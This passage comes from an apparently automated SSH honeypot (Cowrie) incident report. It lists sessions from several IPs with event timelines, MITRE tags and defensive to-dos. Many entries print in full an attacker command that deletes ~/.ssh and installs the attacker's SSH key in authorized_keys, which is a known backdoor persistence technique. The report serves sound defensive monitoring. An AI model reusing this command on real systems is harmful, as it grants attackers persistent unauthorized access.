| `2026-06-09 09:43:35` | `cowrie.command.failed` |
| `2026-06-09 09:43:36` | `cowrie.log.closed` |
| `2026-06-09 09:43:36` | `cowrie.session.params` |
| `2026-06-09 09:43:36` | `cowrie.command.input` |
| `2026-06-09 09:43:36` | `cowrie.session.file_download` |
| `2026-06-09 09:43:36` | `cowrie.log.closed` |
| `2026-06-09 09:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9ba9da0c9d6

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:43 |
| **Last Seen** | 2026-06-09 09:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:43:40` | `cowrie.session.connect` |
| `2026-06-09 09:43:40` | `cowrie.client.version` |
| `2026-06-09 09:43:40` | `cowrie.client.kex` |
| `2026-06-09 09:43:41` | `cowrie.login.success` |
| `2026-06-09 09:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdd9855f419a

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:44 |
| **Last Seen** | 2026-06-09 09:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:44:20` | `cowrie.session.connect` |
| `2026-06-09 09:44:20` | `cowrie.client.version` |
| `2026-06-09 09:44:21` | `cowrie.client.kex` |
| `2026-06-09 09:44:21` | `cowrie.login.success` |
| `2026-06-09 09:44:21` | `cowrie.session.params` |
| `2026-06-09 09:44:21` | `cowrie.command.input` |
| `2026-06-09 09:44:21` | `cowrie.command.failed` |
| `2026-06-09 09:44:21` | `cowrie.log.closed` |
| `2026-06-09 09:44:22` | `cowrie.session.params` |
| `2026-06-09 09:44:22` | `cowrie.command.input` |
| `2026-06-09 09:44:22` | `cowrie.session.file_download` |
| `2026-06-09 09:44:22` | `cowrie.log.closed` |
| `2026-06-09 09:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f36029111e6

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:44 |
| **Last Seen** | 2026-06-09 09:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:44:23` | `cowrie.session.connect` |
| `2026-06-09 09:44:23` | `cowrie.client.version` |
| `2026-06-09 09:44:24` | `cowrie.client.kex` |
| `2026-06-09 09:44:24` | `cowrie.login.success` |
| `2026-06-09 09:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b35d00c3b2

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:45 |
| **Last Seen** | 2026-06-09 09:45 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:45:06` | `cowrie.session.connect` |
| `2026-06-09 09:45:06` | `cowrie.client.version` |
| `2026-06-09 09:45:06` | `cowrie.client.kex` |
| `2026-06-09 09:45:07` | `cowrie.login.success` |
| `2026-06-09 09:45:08` | `cowrie.session.params` |
| `2026-06-09 09:45:08` | `cowrie.command.input` |
| `2026-06-09 09:45:08` | `cowrie.command.failed` |
| `2026-06-09 09:45:09` | `cowrie.log.closed` |
| `2026-06-09 09:45:09` | `cowrie.session.params` |
| `2026-06-09 09:45:09` | `cowrie.command.input` |
| `2026-06-09 09:45:09` | `cowrie.session.file_download` |
| `2026-06-09 09:45:09` | `cowrie.log.closed` |
| `2026-06-09 09:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d850cac75b4e

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:45 |
| **Last Seen** | 2026-06-09 09:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:45:13` | `cowrie.session.connect` |
| `2026-06-09 09:45:13` | `cowrie.client.version` |
| `2026-06-09 09:45:13` | `cowrie.client.kex` |
| `2026-06-09 09:45:14` | `cowrie.login.success` |
| `2026-06-09 09:45:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-922d14755243

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:45 |
| **Last Seen** | 2026-06-09 09:45 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:45:29` | `cowrie.session.connect` |
| `2026-06-09 09:45:29` | `cowrie.client.version` |
| `2026-06-09 09:45:29` | `cowrie.client.kex` |
| `2026-06-09 09:45:30` | `cowrie.login.success` |
| `2026-06-09 09:45:31` | `cowrie.session.params` |
| `2026-06-09 09:45:31` | `cowrie.command.input` |
| `2026-06-09 09:45:31` | `cowrie.command.failed` |
| `2026-06-09 09:45:31` | `cowrie.log.closed` |
| `2026-06-09 09:45:32` | `cowrie.session.params` |
| `2026-06-09 09:45:32` | `cowrie.command.input` |
| `2026-06-09 09:45:32` | `cowrie.session.file_download` |
| `2026-06-09 09:45:32` | `cowrie.log.closed` |
| `2026-06-09 09:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a623f1b80f3

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:45 |
| **Last Seen** | 2026-06-09 09:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:45:35` | `cowrie.session.connect` |
| `2026-06-09 09:45:35` | `cowrie.client.version` |
| `2026-06-09 09:45:36` | `cowrie.client.kex` |
| `2026-06-09 09:45:37` | `cowrie.login.success` |
| `2026-06-09 09:45:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90ff0869e090

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:46 |
| **Last Seen** | 2026-06-09 09:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:46:13` | `cowrie.session.connect` |
| `2026-06-09 09:46:13` | `cowrie.client.version` |
| `2026-06-09 09:46:13` | `cowrie.client.kex` |
| `2026-06-09 09:46:14` | `cowrie.login.success` |
| `2026-06-09 09:46:14` | `cowrie.session.params` |
| `2026-06-09 09:46:14` | `cowrie.command.input` |
| `2026-06-09 09:46:14` | `cowrie.command.failed` |
| `2026-06-09 09:46:14` | `cowrie.log.closed` |
| `2026-06-09 09:46:14` | `cowrie.session.params` |
| `2026-06-09 09:46:14` | `cowrie.command.input` |
| `2026-06-09 09:46:14` | `cowrie.session.file_download` |
| `2026-06-09 09:46:14` | `cowrie.log.closed` |
| `2026-06-09 09:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e55799323163

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:46 |
| **Last Seen** | 2026-06-09 09:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:46:16` | `cowrie.session.connect` |
| `2026-06-09 09:46:16` | `cowrie.client.version` |
| `2026-06-09 09:46:16` | `cowrie.client.kex` |
| `2026-06-09 09:46:17` | `cowrie.login.success` |
| `2026-06-09 09:46:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5569a772caee

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:47 |
| **Last Seen** | 2026-06-09 09:47 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:47:14` | `cowrie.session.connect` |
| `2026-06-09 09:47:14` | `cowrie.client.version` |
| `2026-06-09 09:47:14` | `cowrie.client.kex` |
| `2026-06-09 09:47:16` | `cowrie.login.success` |
| `2026-06-09 09:47:16` | `cowrie.session.params` |
| `2026-06-09 09:47:16` | `cowrie.command.input` |
| `2026-06-09 09:47:16` | `cowrie.command.failed` |
| `2026-06-09 09:47:17` | `cowrie.log.closed` |
| `2026-06-09 09:47:17` | `cowrie.session.params` |
| `2026-06-09 09:47:17` | `cowrie.command.input` |
| `2026-06-09 09:47:18` | `cowrie.session.file_download` |
| `2026-06-09 09:47:18` | `cowrie.log.closed` |
| `2026-06-09 09:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-344668e0f2f5

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:47 |
| **Last Seen** | 2026-06-09 09:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:47:21` | `cowrie.session.connect` |
| `2026-06-09 09:47:21` | `cowrie.client.version` |
| `2026-06-09 09:47:21` | `cowrie.client.kex` |
| `2026-06-09 09:47:23` | `cowrie.login.success` |
| `2026-06-09 09:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5368e8b0cd44

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:47 |
| **Last Seen** | 2026-06-09 09:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:47:22` | `cowrie.session.connect` |
| `2026-06-09 09:47:22` | `cowrie.client.version` |
| `2026-06-09 09:47:22` | `cowrie.client.kex` |
| `2026-06-09 09:47:23` | `cowrie.login.success` |
| `2026-06-09 09:47:23` | `cowrie.session.params` |
| `2026-06-09 09:47:23` | `cowrie.command.input` |
| `2026-06-09 09:47:23` | `cowrie.command.failed` |
| `2026-06-09 09:47:24` | `cowrie.log.closed` |
| `2026-06-09 09:47:24` | `cowrie.session.params` |
| `2026-06-09 09:47:24` | `cowrie.command.input` |
| `2026-06-09 09:47:24` | `cowrie.session.file_download` |
| `2026-06-09 09:47:24` | `cowrie.log.closed` |
| `2026-06-09 09:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31bcbab12592

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:47 |
| **Last Seen** | 2026-06-09 09:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:47:26` | `cowrie.session.connect` |
| `2026-06-09 09:47:26` | `cowrie.client.version` |
| `2026-06-09 09:47:26` | `cowrie.client.kex` |
| `2026-06-09 09:47:27` | `cowrie.login.success` |
| `2026-06-09 09:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fdc41873a567

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:48 |
| **Last Seen** | 2026-06-09 09:48 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:48:08` | `cowrie.session.connect` |
| `2026-06-09 09:48:08` | `cowrie.client.version` |
| `2026-06-09 09:48:08` | `cowrie.client.kex` |
| `2026-06-09 09:48:08` | `cowrie.login.success` |
| `2026-06-09 09:48:08` | `cowrie.session.params` |
| `2026-06-09 09:48:08` | `cowrie.command.input` |
| `2026-06-09 09:48:08` | `cowrie.command.failed` |
| `2026-06-09 09:48:09` | `cowrie.log.closed` |
| `2026-06-09 09:48:09` | `cowrie.session.params` |
| `2026-06-09 09:48:09` | `cowrie.command.input` |
| `2026-06-09 09:48:09` | `cowrie.session.file_download` |
| `2026-06-09 09:48:09` | `cowrie.log.closed` |
| `2026-06-09 09:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e97d994121f

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:48 |
| **Last Seen** | 2026-06-09 09:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:48:11` | `cowrie.session.connect` |
| `2026-06-09 09:48:11` | `cowrie.client.version` |
| `2026-06-09 09:48:11` | `cowrie.client.kex` |
| `2026-06-09 09:48:11` | `cowrie.login.success` |
| `2026-06-09 09:48:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1e6a5ae75c

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:50 |
| **Last Seen** | 2026-06-09 09:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:50:08` | `cowrie.session.connect` |
| `2026-06-09 09:50:08` | `cowrie.client.version` |
| `2026-06-09 09:50:08` | `cowrie.client.kex` |
| `2026-06-09 09:50:08` | `cowrie.login.success` |
| `2026-06-09 09:50:08` | `cowrie.session.params` |
| `2026-06-09 09:50:08` | `cowrie.command.input` |
| `2026-06-09 09:50:08` | `cowrie.command.failed` |
| `2026-06-09 09:50:09` | `cowrie.log.closed` |
| `2026-06-09 09:50:09` | `cowrie.session.params` |
| `2026-06-09 09:50:09` | `cowrie.command.input` |
| `2026-06-09 09:50:09` | `cowrie.session.file_download` |
| `2026-06-09 09:50:09` | `cowrie.log.closed` |
| `2026-06-09 09:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45e794d36704

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:50 |
| **Last Seen** | 2026-06-09 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:50:11` | `cowrie.session.connect` |
| `2026-06-09 09:50:11` | `cowrie.client.version` |
| `2026-06-09 09:50:11` | `cowrie.client.kex` |
| `2026-06-09 09:50:11` | `cowrie.login.success` |
| `2026-06-09 09:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f23eb44819

| Field | Detail |
|---|---|
